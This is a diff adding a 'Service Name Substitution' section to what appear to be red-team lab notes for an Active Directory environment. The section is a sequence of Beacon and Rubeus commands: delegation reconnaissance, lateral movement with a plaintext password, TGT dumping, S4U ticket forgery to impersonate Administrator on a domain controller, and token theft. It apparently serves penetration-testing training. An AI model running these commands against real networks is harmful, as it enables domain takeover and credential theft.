@@ -94,3 +94,48 @@
 -  Use the ticket to access _lon-fs-1_.
     
     1. ls \\lon-fs-1\c$
+
+### Service Name Substitution
+- Search for computers whose msDS-AllowedToDelegateTo attribute is not null.
+    
+    BeaconTypeCopy
+    
+    `ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo`
+    
+-  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
+    
+    BeaconTypeCopy
+    
+    `ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl`
+    
+-  Move laterally to _lon-ws-1_.
+    
+    2.  make_token CONTOSO\rsteel Passw0rd!
+    3.  jump psexec64 lon-ws-1 smb
+-  Dump the TGT for _lon-ws-1_.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
+    
+-  Perform the S4U abuse to obtain a usable service ticket for _time/lon-dc-1_, substituting the service name for _cifs_.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[TGT] /impersonateuser:Administrator /nowrap`
+    
+-  Inject the ticket into a sacraficial logon session.
+    
+    BeaconTypeCopy
+    
+    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
+    
+-  Impersonate the process.
+    
+    1. steal_token [PID]
+-  Verify the ticket has been injected.
+    
+    1. run klist
+-  Use the ticket to list the C$ share on _lon-dc-1_.
+    
+    1. ls \\lon-dc-1\c$
